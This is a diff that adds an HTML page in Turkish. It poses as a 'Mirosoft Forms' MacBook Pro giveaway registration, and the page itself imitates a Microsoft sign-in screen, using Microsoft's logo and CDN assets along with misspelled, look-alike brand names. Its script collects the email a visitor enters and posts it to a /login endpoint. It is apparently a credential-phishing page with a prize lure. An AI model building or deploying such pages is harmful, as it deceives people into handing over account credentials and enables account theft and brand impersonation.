@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>K0Ç Akademı - Ücretsiz Macbook Pro Çekilişi Kayıt Formu | Mirosoft Forms</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="login-container">
+        <img src="/static/logo.jpg" alt="Microsoft" class="logo">
+        <h1>Oturum açın</h1>
+        <form id="loginForm">
+            <input type="email" name="email" placeholder="E-posta, telefon veya Skype" required>
+            <button type="submit">İleri</button>
+        </form>
+        <div class="links">
+            <a href="#">Hesabınız yok mu? Yeni bir hesap oluşturun!</a><br>
+            <a href="#">Hesabınıza erişemiyor musunuz?</a>
+        </div>
+    </div>
+
+    <div class="signin-options">
+        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Key" style="width: 24px; vertical-align: middle; margin-right: 10px;">
+        Oturum açma seçenekleri
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const data = {};
+            formData.forEach((value, key) => data[key] = value);
+            
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert(data.message);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html> 
